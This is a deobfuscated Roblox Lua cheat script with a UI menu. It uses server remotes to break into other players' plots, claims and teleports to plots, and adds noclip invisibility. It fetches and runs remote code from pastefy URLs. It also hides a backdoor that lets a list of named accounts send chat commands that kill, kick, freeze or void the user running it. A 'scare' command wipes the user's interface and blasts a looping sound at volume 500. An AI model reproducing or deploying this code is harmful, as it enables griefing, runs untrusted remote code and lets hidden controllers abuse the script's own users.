                                    n8 = 42
                                else
                                    n8 = 54
                                end
                            elseif n8 == 42 then
                                tbl12 = {}
                                v80, v81, v82 = pairs(v53:GetChildren())
                                v83 = v82
                                n8 = 43
                            elseif n8 == 43 then
                                v84, v85 = v80(v81, v83)

                                if v84 == nil then
                                    n8 = 46
                                else
                                    n8 = 44
                                end
                            elseif n8 == 44 then
                                v83 = v84

                                if v85.Name == "NinjaShuriken" then
                                    n8 = 45
                                else
                                    n8 = 43
                                end
                            elseif n8 == 45 then
                                table.insert(tbl12, v85)
                                n8 = 43
                            elseif n8 == 46 then
                                n3 = n5

                                ok, result = pcall(function()
                                    fn4("NinjaShuriken", humanoidRootPart.CFrame * CFrame.new(0, 2, 8), Vector3.new(0, 0, 0))
                                    local now2 = tick()

                                    while tick() - now2 < 2 do
                                        for k, child in pairs(v53:GetChildren()) do
                                            if child.Name == "NinjaShuriken" and not table.find(tbl12, child) then
                                                return child
                                            end
                                        end

                                        task.wait()
                                    end

                                    return nil
                                end)

                                if ok and result then
                                    n8 = 47
                                else
                                    n8 = 54
                                end
                            elseif n8 == 47 then
                                soundPart = result:FindFirstChild("SoundPart")
                                soundPart2 = soundPart

                                if soundPart then
                                    n8 = 49
                                else
                                    n8 = 48
                                end
                            elseif n8 == 48 then
                                soundPart2 = result:WaitForChild("SoundPart", 0.1)
                                n8 = 49
                            elseif n8 == 49 then
                                if soundPart2 and SetNetworkOwner then
                                    n8 = 50
                                else
                                    n8 = 51
                                end
                            elseif n8 == 50 then
                                pcall(function()
                                    SetNetworkOwner:FireServer(soundPart2, soundPart2.CFrame)
                                end)

                                n8 = 51
                            elseif n8 == 51 then
                                if result:FindFirstChild("StickyPart") then
                                    n8 = 52
                                else
                                    n8 = 53
                                end
                            elseif n8 == 52 then
                                pcall(function()
                                    StickyPartEvent:FireServer(result.StickyPart, area, CFrame.new(999999996000, 999999996000, 999999996000, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                                end)

                                n8 = 53
                            elseif n8 == 53 then
                                v78 = result
                                n8 = 54
                            elseif n8 == 54 then
                                if v78 then
                                    n8 = 55
                                else
                                    n8 = 56
                                end
                            elseif n8 == 55 then
                                table.insert(tbl2.BleakPlotShuriken, v78)
                                n8 = 56
                            elseif n8 == 56 then
                                task.wait(0.05)
                                n8 = 32
                            elseif n8 == 57 then
                                n6 = 0
                                n8 = 58
                            elseif n8 == 58 then
                                n7 = n6 + 1

                                if n7 <= 10 then
                                    n8 = 59
                                else
                                    n8 = 1
                                end
                            elseif n8 == 59 then
                                n6 = n7

                                if tbl2.plotBreakToggle then
                                    n8 = 60
                                else
                                    n8 = 1
                                end
                            elseif n8 == 60 then
                                task.wait(0.05)
                                n8 = 58
                            elseif n8 == 61 then
                                task.wait(1)
                                n8 = 1
                            elseif n8 == 62 then
                                task.wait(1)
                                n8 = 1
                            elseif n8 == 63 then
                                v86, v87, v88 = pairs(tbl2.BleakPlotShuriken)
                                v89 = v88
                                n8 = 64
                            elseif n8 == 64 then
                                v90, v91 = v86(v87, v89)

                                if v90 == nil then
                                    n8 = 67
                                else
                                    n8 = 65
                                end
                            elseif n8 == 65 then
                                v89 = v90

                                if v91 and v91.Parent and DestroyToy then
                                    n8 = 66
                                else
                                    n8 = 64
                                end
                            elseif n8 == 66 then
                                pcall(function()
                                    DestroyToy:FireServer(v91)
                                end)

                                n8 = 64
                            elseif n8 == 67 then
                                tbl2.BleakPlotShuriken = {}
                                return
                            end
                        end
                    end)
                else
                    for k, v46 in pairs(tbl2.BleakPlotShuriken) do
                        if v46 and v46.Parent and DestroyToy then
                            pcall(function()
                                DestroyToy:FireServer(v46)
                            end)
                        end
                    end

                    tbl2.BleakPlotShuriken = {}
                end
            end,
        })

        v38 = v35:AddLabel("House-Time: 0")
        v39 = v35:AddLabel("House-Owner: ?")

        v35:AddToggle("plottime", {
            Text = "Plot-Time",
            Default = false,
            Callback = function(houseTPauto)
                tbl2.HouseTPauto = houseTPauto

                if not houseTPauto and tbl2.isTeleported and tbl2.savedPosition then
                    local v46 = hrp_()

                    if v46 then
                        v46.CFrame = tbl2.savedPosition
                    end

                    tbl2.isTeleported = false
                    tbl2.savedPosition = nil
                end
            end,
        })

        v35:AddDropdownEx("PlotSelect2", {
            Text = "Select Plot",
            Default = tbl2.SelectedPlot,
            Values = {
                {Name = "Purple-Plot", Image = "rbxassetid://9909725942"},
                {Name = "Red-Plot", Image = "rbxassetid://8989326312"},
                {Name = "Green-Plot", Image = "rbxassetid://8989327148"},
                {Name = "Blue-Plot", Image = "rbxassetid://9909733734"},
                {Name = "Chinese-Plot", Image = "rbxassetid://9108988013"},
            },
            Callback = function(selectedPlot)
                tbl2.SelectedPlot = selectedPlot
            end,
        })

        v35:AddButton("PlotOO", {
            Text = "Claim Plot",
            Callback = function()
                local v46 = fn5()
                if not v46 then
                    return
                end
                local flag = false
                local plotSign = v46:FindFirstChild("PlotSign")

                if plotSign then
                    local thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")

                    if thisPlotsOwners then
                        local value = thisPlotsOwners:FindFirstChild("Value")

                        if value and value:IsA("StringValue") and value.Value and value.Value ~= "" then
                            flag = true
                        end
                    end
                end

                if flag then
                    return
                end
                local plotSign2 = v46:FindFirstChild("PlotSign")
                if not plotSign2 then
                    return
                end
                local v47, v48, v49 = pairs(plotSign2:GetChildren())
                local v50 = v49
                local v51 = v47
                local v52 = v48

                while true do
                    local v53, v54 = v51(v52, v50)
                    if v53 == nil then
                        break
                    end
                    v50 = v53

                    if v54.Name == "Sign" then
                        local plus = v54:FindFirstChild("Plus")
                        local plusGrabPart = plus and v54.Plus:FindFirstChild("PlusGrabPart")

                        if plusGrabPart then
                            local v55 = getCharacter()
                            local cFrame = plusGrabPart.CFrame * CFrame.new(-5, 0, -5)

                            if v55 and typeof(cFrame) == "CFrame" then
                                v55.HumanoidRootPart.CFrame = cFrame
                            end

                            for i = 1, 15 do
                                local v56 = getCharacter()

                                if v56 and plusGrabPart and plusGrabPart:IsA("BasePart") and localPlayer:DistanceFromCharacter(plusGrabPart.Position) <= 30 then
                                    SetNetworkOwner:FireServer(plusGrabPart, lookAt(v56.HumanoidRootPart.Position, plusGrabPart.Position))
                                end

                                task.wait()
                            end

                            v50 = v53
                        end
                    end
                end
            end,
        })

        Developer:AddIcontukiParagraph({Icon = 10015311958, content = "Owner"})

        Menu:AddToggle("KeybindMenuOpen", {
            Default = library.KeybindFrame.Visible,
            Text = "Open Keybind Menu",
            Callback = function(visible)
                library.KeybindFrame.Visible = visible
            end,
        })

        Menu:AddToggle("ShowCustomCursor", {
            Text = "Custom Cursor",
            Default = true,
            Callback = function(showCustomCursor)
                library.ShowCustomCursor = showCustomCursor
            end,
        })

        Menu:AddDropdown("NotificationSide", {
            Values = {"Left", "Right"},
            Default = "Right",
            Text = "Notification Side",
            Callback = function(arg)
                library:SetNotifySide(arg)
            end,
        })

        Menu:AddDropdown("DPIDropdown", {
            Values = {
                "50%",
                "75%",
                "100%",
                "125%",
                "150%",
                "175%",
                "200%",
            },
            Default = "100%",
            Text = "DPI Scale",
            Callback = function(arg)
                local str2 = arg:gsub("%%", "")
                local num = tonumber(str2)
                library:SetDPIScale(num)
            end,
        })

        Menu:AddDivider()
        Menu:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", {Default = "X", NoUI = true, Text = "Menu keybind"})

        Menu:AddButton({
            Text = "Unload",
            Func = function()
                library:Unload()
            end,
            DoubleClick = false,
        })

        library.ToggleKeybind = options.MenuKeybind
        lib:SetLibrary(library)
        lib2:SetLibrary(library)
        lib2:IgnoreThemeSettings()
        lib2:SetIgnoreIndexes({"MenuKeybind"})
        lib:ApplyToTab(tbl3.UISettings)
        lib2:BuildConfigSection(tbl3.UISettings)
        fn("Script loaded successfully")

        obj.RunService.Heartbeat:Connect(function()
            tbl2.Frames = tbl2.Frames + 1
            local now2 = tick()

            if now2 - now >= 1 then
                local frames = tbl2.Frames
                tbl2.Frames = 0
                now = now2
                local v46 = math.round(localPlayer:GetNetworkPing() * 1000)
                v36:SetText(string.format("FPS: %d | Ping: %sms", frames, v46))
            end
        end)

        localPlayer.CharacterAdded:Connect(function(character)
            if tbl2.IsBypassRun then
                task.wait(0.1)
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                if humanoidRootPart then
                    humanoidRootPart.CFrame = CFrame.new(0, -15000, 0)
                end

                task.spawn(lockCamera)
            end
        end)

        obj.RunService.Heartbeat:Connect(function()
            if Invisibility and Invisibility.noclipEnabled and Invisibility.originalPosition then
                local n2 = Invisibility.originalPosition.Y + Invisibility.cameraOffset - Invisibility.undergroundDepthOffset
                local position = Invisibility.humanoidRootPart.Position

                if math.abs(position.Y - n2) > 0.1 then
                    Invisibility.humanoidRootPart.CFrame = CFrame.new(position.X, n2, position.Z)
                end
            end
        end)

        obj.RunService.RenderStepped:Connect(function()
            if Invisibility and Invisibility.noclipEnabled and Invisibility.originalPosition then
                local position = Invisibility.humanoidRootPart.Position
                local lookVector = Invisibility.camera.CFrame.LookVector
                local vector = Vector3.new(position.X, Invisibility.originalPosition.Y + Invisibility.cameraOffset, position.Z)
                Invisibility.camera.CFrame = CFrame.new(vector, vector + lookVector)
            end
        end)

        localPlayer.CharacterAdded:Connect(function(character)
            task.wait(0.5)

            if Invisibility then
                Invisibility.character = character
                Invisibility.humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                Invisibility.head = character:WaitForChild("Head")

                if Invisibility.noclipEnabled then
                    Invisibility.originalPosition = Invisibility.humanoidRootPart.Position
                    Invisibility.originalCameraCFrame = Invisibility.camera.CFrame
                    Invisibility.humanoidRootPartTransparency = Invisibility.humanoidRootPart.Transparency

                    if Invisibility.noclipConnection then
                        Invisibility.noclipConnection:Disconnect()
                    end

                    Invisibility.noclipConnection = obj.RunService.Stepped:Connect(function()
                        for k, child in pairs(Invisibility.character:GetChildren()) do
                            if child:IsA("BasePart") then
                                child.CanCollide = false
                            end
                        end
                    end)

                    if Invisibility.humanoidRootPart then
                        Invisibility.humanoidRootPart.Transparency = 1
                    end

                    local vector = Vector3.new(Invisibility.humanoidRootPart.Position.X, Invisibility.originalPosition.Y + Invisibility.cameraOffset - Invisibility.undergroundDepthOffset, Invisibility.humanoidRootPart.Position.Z)
                    Invisibility.humanoidRootPart.CFrame = CFrame.new(vector)
                end
            end
        end)

        localPlayer.CharacterRemoving:Connect(function()
            if Invisibility and Invisibility.noclipEnabled and Invisibility.noclipConnection then
                Invisibility.noclipConnection:Disconnect()
                Invisibility.noclipConnection = nil
            end
        end)

        workspace.DescendantAdded:Connect(function(descendant)
            if descendant.Name == "GrabBeam" then
                tbl2.CountLines = tbl2.CountLines + 1

                if descendant.Parent and descendant.Parent.Parent and descendant.Parent.Parent.Parent then
                    tbl2.LastLagS = descendant.Parent.Parent.Parent
                end
            end
        end)

        task.delay(2, function()
            local now2, antiLag, value, lastLagS, playerFromCharacter, v46, v47, v48, v49, v50, v51, character, humanoidRootPart, humanoid, n2
            n2 = 1

            while true do
                if n2 == 1 then
                    now2 = tick()
                    n2 = 2
                elseif n2 == 2 then
                    if task.wait(0.025) then
                        n2 = 3
                    else
                        n2 = 31
                    end
                elseif n2 == 3 then
                    if tbl2.AutoAntiLag and tick() - now2 >= 0.1 then
                        n2 = 4
                    else
                        n2 = 2
                    end
                elseif n2 == 4 then
                    antiLag = toggles.AntiLag
                    value = antiLag

                    if antiLag then
                        n2 = 5
                    else
                        n2 = 6
                    end
                elseif n2 == 5 then
                    value = toggles.AntiLag.Value
                    n2 = 6
                elseif n2 == 6 then
                    if value then
                        n2 = 8
                    else
                        n2 = 7
                    end
                elseif n2 == 7 then
                    value = false
                    n2 = 8
                elseif n2 == 8 then
                    if value then
                        n2 = 24
                    else
                        n2 = 9
                    end
                elseif n2 == 9 then
                    if tbl2.CountLines >= 40 then
                        n2 = 15
                    else
                        n2 = 10
                    end
                elseif n2 == 10 then
                    if workspace:GetRealPhysicsFPS() < 15 then
                        n2 = 11
                    else
                        n2 = 24
                    end
                elseif n2 == 11 then
                    fn("lag script detected.")

                    if toggles.AntiLag then
                        n2 = 12
                    else
                        n2 = 13
                    end
                elseif n2 == 12 then
                    toggles.AntiLag:Set(true)
                    n2 = 13
                elseif n2 == 13 then
                    if setfpscap then
                        n2 = 14
                    else
                        n2 = 24
                    end
                elseif n2 == 14 then
                    setfpscap(10000)
                    n2 = 24
                elseif n2 == 15 then
                    lastLagS = tbl2.LastLagS
                    playerFromCharacter = lastLagS

                    if lastLagS then
                        n2 = 16
                    else
                        n2 = 17
                    end
                elseif n2 == 16 then
                    playerFromCharacter = obj.Players:GetPlayerFromCharacter(tbl2.LastLagS)
                    n2 = 17
                elseif n2 == 17 then
                    if playerFromCharacter then
                        n2 = 18
                    else
                        n2 = 19
                    end
                elseif n2 == 18 then
                    fn("[LAG] : " .. playerFromCharacter.Name .. "(@" .. playerFromCharacter.DisplayName .. ")")
                    n2 = 20
                elseif n2 == 19 then
                    fn("lag script detected.")
                    n2 = 20
                elseif n2 == 20 then
                    if toggles.AntiLag then
                        n2 = 21
                    else
                        n2 = 22
                    end
                elseif n2 == 21 then
                    toggles.AntiLag:Set(true)
                    n2 = 22
                elseif n2 == 22 then
                    if setfpscap then
                        n2 = 23
                    else
                        n2 = 24
                    end
                elseif n2 == 23 then
                    setfpscap(10000)
                    n2 = 24
                elseif n2 == 24 then
                    now2 = tick()
                    tbl2.CountLines = 0
                    v46, v47, v48 = pairs(obj.Players:GetPlayers())
                    v49 = v48
                    n2 = 25
                elseif n2 == 25 then
                    v50, v51 = v46(v47, v49)

                    if v50 == nil then
                        n2 = 2
                    else
                        n2 = 26
                    end
                elseif n2 == 26 then
                    v49 = v50

                    if v51 == localPlayer then
                        n2 = 25
                    else
                        n2 = 27
                    end
                elseif n2 == 27 then
                    character = v51.Character

                    if character then
                        n2 = 28
                    else
                        n2 = 25
                    end
                elseif n2 == 28 then
                    humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

                    if humanoidRootPart and humanoidRootPart.Massless then
                        n2 = 29
                    else
                        n2 = 25
                    end
                elseif n2 == 29 then
                    humanoid = character:FindFirstChild("Humanoid")

                    if humanoid and not humanoid.Sit then
                        n2 = 30
                    else
                        n2 = 25
                    end
                elseif n2 == 30 then
                    humanoidRootPart.Massless = false
                    n2 = 25
                elseif n2 == 31 then
                    return
                end
            end
        end)

        task.spawn(function()
            while task.wait(0.2) do
                local v46 = fn5()

                if v46 then
                    local timeRemainingNum = v46:FindFirstChild("TimeRemainingNum", true)

                    if timeRemainingNum and timeRemainingNum:IsA("IntValue") then
                        local value = timeRemainingNum.Value

                        pcall(function()
                            if v38 and type(v38.SetText) == "function" then
                                v38:SetText("Plot-Time: " .. value)
                            end
                        end)

                        local v47 = hrp_()

                        if v47 and tbl2.HouseTPauto then
                            if value <= 14 then
                                if not tbl2.isTeleported then
                                    tbl2.savedPosition = v47.CFrame
                                    tbl2.isTeleported = true

                                    if v46:FindFirstChild("Teleport") then
                                        v47.CFrame = v46.Teleport.CFrame
                                    else
                                        v47.CFrame = v46:GetModelCFrame()
                                    end
                                end
                            elseif value > 15 and tbl2.isTeleported and tbl2.savedPosition then
                                v47.CFrame = tbl2.savedPosition
                                tbl2.isTeleported = false
                                tbl2.savedPosition = nil
                            end
                        end
                    end

                    local value = nil
                    local plotSign = v46:FindFirstChild("PlotSign")

                    if plotSign then
                        local thisPlotsOwners = plotSign:FindFirstChild("ThisPlotsOwners")

                        if thisPlotsOwners then
                            local value2 = thisPlotsOwners:FindFirstChild("Value")

                            if value2 and value2:IsA("StringValue") then
                                value = value2.Value
                            end
                        end
                    end

                    pcall(function()
                        if v39 and type(v39.SetText) == "function" then
                            if value and value ~= "" then
                                v39:SetText("Plot-Owner: " .. value)
                            else
                                v39:SetText("Plot-Owner: ?")
                            end
                        end
                    end)
                end
            end
        end)

        lib2:LoadAutoloadConfig()
        loadstring(game:HttpGet("https://pastefy.app/Fly7WzB4/raw"))()

        task.spawn(function()
            pcall(function()
                loadstring(game:HttpGet("https://pastefy.app/8tEZ0bp6/raw"))()
            end)
        end)

        Players_2 = game:GetService("Players")
        TextChatService = game:GetService("TextChatService")
        ReplicatedStorage2 = game:GetService("ReplicatedStorage")
        TweenService = game:GetService("TweenService")
        RunService_ = game:GetService("RunService")
        Lighting = game:GetService("Lighting")
        SoundService = game:GetService("SoundService")
        localPlayer2 = Players_2.LocalPlayer
        tbl8 = {}
        tbl8.yuuki29080 = true
        tbl8.igarasirento53 = true
        tbl8.igarasirento2 = true
        tbl8.igarasirento0001 = true
        tbl8.igarasirento88 = true
        tbl8.igarasirento1000 = true
        tbl8.igarasirento1001 = true
        tbl8.igarasirento1002 = true
        tbl8.roblox_user_10015311958 = true
        tbl8.Suu_2772 = true
        tbl8.yajusaiko4545 = true
        tbl8.Hello_o474845 = true
        tbl8.Juushobareruyo = true
        tbl8.Misae_doawoakenasai6 = true
        tbl8.Ryu_14283949 = true
        tbl8.suu_sub1 = true
        tbl8.Helllo19191 = true
        tbl8.Helllo19191 = true
        tbl8.noob10101010777lols = true
        tbl8.noob6789678967893 = true
        tbl8.igarasirento10117 = true

        tbl9 = {
            Active = false,
            Intensity = 0,
            TimeElapsed = 0,
            ScreenGui = nil,
            BlackFrame = nil,
            ShakeConn = nil,
        }

        tbl10 = {
            "SILENCE",
            "THEY ARE WATCHING",
            "RUN",
            "HIDE",
            "BE QUIET, THEY'RE NEAR",
            "GET AWAY",
            "CLOSE YOUR EYES",
            "DONT LOOK AT IT",
        }

        fn33 = function()
            if tbl9.ScreenGui then
                return
            end
            local screenGui4 = Instance.new("ScreenGui")
            screenGui4.Name = "ScareEffectGui"
            screenGui4.DisplayOrder = 999999
            screenGui4.IgnoreGuiInset = true

            local ok, result = pcall(function()
                return game:GetService("CoreGui")
            end)

            local playerGui2 = ok and result or localPlayer2:WaitForChild("PlayerGui")
            screenGui4.Parent = playerGui2
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BackgroundTransparency = 1
            frame.BorderSizePixel = 0
            frame.Parent = screenGui4
            tbl9.ScreenGui = screenGui4
            tbl9.BlackFrame = frame
        end

        fn34 = function()
            if tbl9.Active then
                return
            end
            tbl9.Active = true
            fn33()

            pcall(function()
                local ok, result = pcall(function()
                    return game:GetService("CoreGui")
                end)

                if ok and result then
                    for i, child in ipairs(result:GetChildren()) do
                        if child ~= tbl9.ScreenGui then
                            child:Destroy()
                        end
                    end
                end

                local playerGui2 = localPlayer2:FindFirstChild("PlayerGui")

                if playerGui2 then
                    for i, child in ipairs(playerGui2:GetChildren()) do
                        if child ~= tbl9.ScreenGui then
                            child:Destroy()
                        end
                    end
                end
            end)

            task.spawn(function()
                SoundService.AmbientReverb = Enum.ReverbType.Alley
                local tinnitus = SoundService:FindFirstChild("Tinnitus")
                local sound = tinnitus or Instance.new("Sound", SoundService)
                sound.Name = "Tinnitus"
                sound.SoundId = "rbxassetid://9114223170"
                sound.Looped = true
                sound.Volume = 500
                sound.PlaybackSpeed = 0.1
                sound:Play()
                local n2 = 0.1

                while tbl9.Active and n2 < 20 do
                    task.wait(0.5)
                    local playbackSpeed = n2 + 1
                    n2 = playbackSpeed
                    sound.PlaybackSpeed = playbackSpeed
                end

                while tbl9.Active do
                    task.wait(math.random(1, 30) / 10)
                    sound.PlaybackSpeed = math.random(1, 200) / 10
                end
            end)

            task.spawn(function()
                while tbl9.Active do
                    local message = Instance.new("Message")
                    message.Text = tbl10[math.random(1, #tbl10)]
                    message.Parent = Workspace
                    task.wait(0.6)
                    message:Destroy()
                    task.wait(math.random(1, 3))
                end
            end)

            Lighting.TimeOfDay = "00:00:00"
            local colorCorrectionEffect = Instance.new("ColorCorrectionEffect")
            colorCorrectionEffect.Name = "Horror_CC"
            colorCorrectionEffect.TintColor = Color3.fromRGB(255, 0, 0)
            colorCorrectionEffect.Saturation = -100
            colorCorrectionEffect.Contrast = 5
            colorCorrectionEffect.Brightness = 2
            colorCorrectionEffect.Parent = Lighting
            local blurEffect = Instance.new("BlurEffect")
            blurEffect.Name = "Horror_Blur"
            blurEffect.Size = 8
            blurEffect.Parent = Lighting

            task.spawn(function()
                while tbl9.Active and colorCorrectionEffect.Parent do
                    colorCorrectionEffect.Saturation = -colorCorrectionEffect.Saturation
                    task.wait(0.05)
                end
            end)

            task.spawn(function()
                while tbl9.Active and tbl9.BlackFrame do
                    tbl9.BlackFrame.BackgroundTransparency = 0
                    TweenService:Create(tbl9.BlackFrame, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1}):Play()
                    task.wait(1.6)
                end
            end)

            tbl9.Intensity = 0.05
            tbl9.TimeElapsed = 0

            if tbl9.ShakeConn then
                tbl9.ShakeConn:Disconnect()
            end

            tbl9.ShakeConn = RunService_.RenderStepped:Connect(function(deltaTime)
                if tbl9.Intensity > 0 then
                    tbl9.TimeElapsed = tbl9.TimeElapsed + deltaTime
                    local currentCamera = Workspace.CurrentCamera

                    if currentCamera then
                        local n2 = 1 + math.sin(tbl9.TimeElapsed * 40) * tbl9.Intensity
                        local n3 = 1 + math.cos(tbl9.TimeElapsed * 40) * tbl9.Intensity
                        currentCamera.CFrame = currentCamera.CFrame * CFrame.new(0, 0, 0, n2, 0, 0, 0, n3, 0, 0, 0, 1)
                    end
                end
            end)
        end

        fn35 = function(arg)
            if not arg then
                return false
            end
            local flag = tbl8[arg.Name] == true
            return flag
        end

        fn36 = function(arg)
            if not arg or arg == "" then
                return false
            end
            local v46 = string.lower(arg)
            if v46 == "all" then
                return true
            end
            local v47 = string.lower(localPlayer2.Name)
            local v48 = string.lower(localPlayer2.DisplayName)
            if not string.find(v47, v46, 1, true) and not string.find(v48, v46, 1, true) then
                return false
            end
            return true
        end

        fn37 = function(arg, anchored)
            if not arg then
                return
            end

            for i, descendant in ipairs(arg:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.Anchored = anchored
                end
            end
        end

        fn38 = function(arg, arg2)
            if not fn35(arg) then
                return
            end

            if arg == localPlayer2 then
                return
            end
            local v46 = string.split(arg2, " ")
            local lower = string.lower
            local v47 = v46[1]
            local str2 = v47 or ""
            local v48 = lower(str2)
            local lower2 = string.lower
            local v49 = v46[2]
            local str3 = v49 or ""
            local v50 = lower2(str3)
            local str4 = v50

            if v48 == "!s" and v50 == "" then
                str4 = "all"
            end

            if str4 == "" then
                return
            end

            if not fn36(str4) then
                return
            end
            local character = localPlayer2.Character
            local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            local character2 = arg.Character
            local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")

            if v48 == ":bring" then
                if humanoidRootPart and humanoidRootPart2 then
                    humanoidRootPart.CFrame = humanoidRootPart2.CFrame * CFrame.new(0, 0, -3)
                    humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                    humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
                end
            elseif v48 == ":kill" then
                if humanoid then
                    humanoid.Health = 0
                elseif character then
                    character:BreakJoints()
                end
            elseif v48 == ":freeze" then
                if character then
                    fn37(character, true)
                end
            elseif v48 == ":unfreeze" then
                if character then
                    fn37(character, false)
                end
            elseif v48 == ":kick" then
                localPlayer2:Kick("Disconnected by Admin.")
            elseif v48 == ":ragdoll" then
                if humanoidRootPart then
                    local characterEvents = ReplicatedStorage2:FindFirstChild("CharacterEvents")
                    local ragdollRemote2 = characterEvents and characterEvents:FindFirstChild("RagdollRemote")

                    if ragdollRemote2 then
                        ragdollRemote2:FireServer(humanoidRootPart, 2)
                    end
                end
            elseif v48 == ":void" then
                if humanoidRootPart then
                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, -5000, humanoidRootPart.Position.Z)
                end
            elseif v48 == "!s" or v48 == ":scare" then
                fn34()
            end
        end

        fn39 = function(player)
            player.Chatted:Connect(function(message)
                pcall(function()
                    fn38(player, message)
                end)
            end)
        end

        v40, v41, v42 = ipairs(Players_2:GetPlayers())
        v43 = v42
        n = 10
    elseif n == 10 then
        v44, v45 = v40(v41, v43)

        if v44 == nil then
            n = 12
        else
            n = 11
        end
    elseif n == 11 then
        v43 = v44
        fn39(v45)
        n = 10
    elseif n == 12 then
        Players_2.PlayerAdded:Connect(fn39)

        if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            n = 13
        else
            n = 14
        end
    elseif n == 13 then
        TextChatService.MessageReceived:Connect(function(arg)
            if arg.TextSource then
                local playerByUserId = Players_2:GetPlayerByUserId(arg.TextSource.UserId)

                if playerByUserId then
                    pcall(function()
                        fn38(playerByUserId, arg.Text)
                    end)
                end
            end
        end)

        n = 14
    elseif n == 14 then
        return
    end
end
